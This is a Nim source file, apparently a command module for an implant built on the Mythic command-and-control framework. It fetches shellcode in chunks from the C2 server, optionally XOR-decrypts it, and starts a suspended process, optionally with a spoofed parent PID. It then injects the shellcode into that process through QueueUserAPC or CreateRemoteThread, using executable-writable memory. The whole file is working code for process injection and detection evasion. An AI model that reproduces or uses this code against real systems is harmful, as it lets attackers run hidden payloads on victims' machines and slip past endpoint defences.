import ../utils/mythic_responses
import ../utils/debug
import ../global_data
import std/[json, strutils, strformat, base64]

when defined(windows):
  import winim/lean
  
  const
    PROCESS_CREATE_PROCESS = 0x0080
    PROCESS_QUERY_INFORMATION = 0x0400
    EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
  
  type
    PROC_THREAD_ATTRIBUTE_LIST = object
    LPPROC_THREAD_ATTRIBUTE_LIST = ptr PROC_THREAD_ATTRIBUTE_LIST
    
    STARTUPINFOEXA = object
      StartupInfo: STARTUPINFOA
      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST
  
  proc InitializeProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, 
                                         dwAttributeCount: DWORD, dwFlags: DWORD, 
                                         lpSize: ptr SIZE_T): WINBOOL
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc UpdateProcThreadAttribute(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST,
                                dwFlags: DWORD, Attribute: DWORD_PTR, 
                                lpValue: PVOID, cbSize: SIZE_T,
                                lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
    {.importc, dynlib: "kernel32.dll", stdcall.}
  
  proc DeleteProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST): void
    {.importc, dynlib: "kernel32.dll", stdcall.}

type
  InjectHollowArgs = object
    uuid: string
    shellcode_name: string
    technique: string
    key: string

proc xorDecrypt(data: seq[byte], key: string): seq[byte] =
  ## XOR decrypt shellcode with key
  if key.len == 0:
    return data
  
  result = newSeq[byte](data.len)
  for i in 0..<data.len:
    result[i] = data[i] xor byte(key[i mod key.len])

when defined(windows):
  proc createSuspendedProcess(spawntoPath: string, ppid: uint32): tuple[success: bool, pi: PROCESS_INFORMATION, error: string] =
    ## Create a suspended process with optional PPID spoofing
    var pi: PROCESS_INFORMATION
    
    if ppid != 0:
      # PPID spoofing - use extended process creation
      let parentHandle = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION, 0, DWORD(ppid))
      if parentHandle == 0:
        return (false, pi, "Failed to open parent process: " & $GetLastError())
      
      # Initialize attribute list
      var size: SIZE_T = 0
      discard InitializeProcThreadAttributeList(nil, 1, 0, addr size)
      
      var attrList = newSeq[byte](size)
      let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST](addr attrList[0])
      
      if InitializeProcThreadAttributeList(attrListPtr, 1, 0, addr size) == 0:
        CloseHandle(parentHandle)
        return (false, pi, "Failed to initialize attribute list: " & $GetLastError())
      
      # Update attribute with parent process handle
      if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
        DeleteProcThreadAttributeList(attrListPtr)
        CloseHandle(parentHandle)
        return (false, pi, "Failed to update attribute list: " & $GetLastError())
      
      # Create process with extended startup info
      var siEx: STARTUPINFOEXA
      siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA).DWORD
      siEx.lpAttributeList = attrListPtr
      
      let success = CreateProcessA(
        spawntoPath,
        nil,
        nil,
        nil,
        FALSE,
        CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
        nil,
        nil,
        addr siEx.StartupInfo,
        addr pi
      )
      
      DeleteProcThreadAttributeList(attrListPtr)
      CloseHandle(parentHandle)
      
      if success == 0:
        return (false, pi, "Failed to create process with PPID spoofing: " & $GetLastError())
    else:
      # Normal process creation without PPID spoofing
      var si: STARTUPINFOA
      si.cb = sizeof(STARTUPINFOA).DWORD
      
      let success = CreateProcessA(
        spawntoPath,
        nil,
        nil,
        nil,
        FALSE,
        CREATE_SUSPENDED,
        nil,
        nil,
        addr si,
        addr pi
      )
      
      if success == 0:
        return (false, pi, "Failed to create process: " & $GetLastError())
    
    return (true, pi, "")

proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
  ## Inject shellcode using QueueUserAPC technique
  when defined(windows):
    try:
      # Validate shellcode
      if shellcode.len == 0:
        return (false, "Shellcode is empty (0 bytes)")
      
      # Get spawnto path based on architecture
      when hostCPU == "amd64":
        let (spawntoPath, spawntoArgs) = getSpawntoX64()
      else:
        let (spawntoPath, spawntoArgs) = getSpawntoX86()
      
      if spawntoPath.len == 0:
        return (false, "spawnto path is not set for this architecture")
      
      # Get PPID for spoofing
      let ppid = getPpid()
      
      # Create suspended process with optional PPID spoofing
      let (success, pi, errorMsg) = createSuspendedProcess(spawntoPath, ppid)
      if not success:
        return (false, errorMsg)
      
      # Allocate memory in target process
      let pRemote = VirtualAllocEx(
        pi.hProcess,
        nil,
        SIZE_T(shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      )
      
      if pRemote == nil:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, &"VirtualAllocEx failed: {err} (size: {shellcode.len} bytes)")
      
      # Write shellcode to target process
      var bytesWritten: SIZE_T
      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0], SIZE_T(shellcode.len), addr bytesWritten) == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "WriteProcessMemory failed: " & $err)
      
      # Queue APC to suspended thread
      if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "QueueUserAPC failed: " & $err)
      
      # Resume thread to execute APC
      discard ResumeThread(pi.hThread)
      
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (true, "")
      
    except Exception as e:
      return (false, "Exception: " & e.msg)
  else:
    return (false, "Not on Windows")

proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, error: string] =
  ## Inject shellcode using CreateRemoteThread technique
  when defined(windows):
    try:
      # Validate shellcode
      if shellcode.len == 0:
        return (false, "Shellcode is empty (0 bytes)")
      
      # Get spawnto path based on architecture
      when hostCPU == "amd64":
        let (spawntoPath, spawntoArgs) = getSpawntoX64()
      else:
        let (spawntoPath, spawntoArgs) = getSpawntoX86()
      
      if spawntoPath.len == 0:
        return (false, "spawnto path is not set for this architecture")
      
      # Get PPID for spoofing
      let ppid = getPpid()
      
      # Create suspended process with optional PPID spoofing
      let (success, pi, errorMsg) = createSuspendedProcess(spawntoPath, ppid)
      if not success:
        return (false, errorMsg)
      
      # Allocate memory in target process
      let pRemote = VirtualAllocEx(
        pi.hProcess,
        nil,
        SIZE_T(shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      )
      
      if pRemote == nil:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, &"VirtualAllocEx failed: {err} (size: {shellcode.len} bytes)")
      
      # Write shellcode to target process
      var bytesWritten: SIZE_T
      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0], SIZE_T(shellcode.len), addr bytesWritten) == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "WriteProcessMemory failed: " & $err)
      
      # Create remote thread
      var threadId: DWORD
      let hRemoteThread = CreateRemoteThread(
        pi.hProcess,
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](pRemote),
        nil,
        0,
        addr threadId
      )
      
      if hRemoteThread == 0:
        let err = GetLastError()
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, "CreateRemoteThread failed: " & $err)
      
      CloseHandle(hRemoteThread)
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (true, "")
      
    except Exception as e:
      return (false, "Exception: " & e.msg)
  else:
    return (false, "Not on Windows")

proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
  ## Inject shellcode into a remote process using process hollowing
  when defined(windows):
    try:
      let args = to(params, InjectHollowArgs)
      
      debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
      debug &"[DEBUG] Technique: {args.technique}"
      debug &"[DEBUG] UUID for download: {args.uuid}"
      
      # Return initial response - request the file from Mythic
      return %*{
        "task_id": taskId,
        "upload": {
          "file_id": args.uuid,
          "chunk_num": 1,
          "chunk_size": 512000,
          "full_path": ""
        }
      }
      
    except Exception as e:
      return mythicError(taskId, "Inject hollow error: " & e.msg)
  else:
    return mythicError(taskId, "inject_hollow command is only available on Windows")

proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: string, 
                               totalChunks: int, currentChunk: int, 
                               fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the shellcode file being downloaded
  when defined(windows):
    try:
      let args = to(params, InjectHollowArgs)
      
      # Decode and append chunk data
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      debug &"[DEBUG] Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      # If more chunks remain, request the next one
      if currentChunk < totalChunks:
        return %*{
          "task_id": taskId,
          "upload": {
            "chunk_size": 512000,
            "file_id": args.uuid,
            "chunk_num": currentChunk + 1,
            "full_path": ""
          }
        }
      
      # All chunks received - execute the injection
      return executeInjectHollow(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, "Inject hollow chunk processing error: " & e.msg)
  else:
    return mythicError(taskId, "inject_hollow command is only available on Windows")

proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Execute the shellcode injection after download is complete
  when defined(windows):
    try:
      let args = to(params, InjectHollowArgs)
      
      # Validate shellcode was received
      if shellcode.len == 0:
        return mythicError(taskId, "Shellcode is empty - file download may have failed")
      
      # Decrypt shellcode if key is provided
      var finalShellcode = shellcode
      if args.key.len > 0:
        debug "[DEBUG] Decrypting shellcode with XOR key"
        finalShellcode = xorDecrypt(shellcode, args.key)
      
      debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
      
      var result: tuple[success: bool, error: string]
      case args.technique.toLower():
      of "apc":
        result = injectViaAPC(finalShellcode)
      of "createremotethread":
        result = injectViaCreateRemoteThread(finalShellcode)
      else:
        return mythicError(taskId, &"Unknown injection technique: {args.technique}")
      
      if result.success:
        return mythicSuccess(taskId, &"Shellcode injected successfully via {args.technique}")
      else:
        return mythicError(taskId, &"Failed to inject shellcode via {args.technique}: {result.error}")
      
    except Exception as e:
      return mythicError(taskId, "Inject hollow execution error: " & e.msg)
  else:
    return mythicError(taskId, "inject_hollow command is only available on Windows")
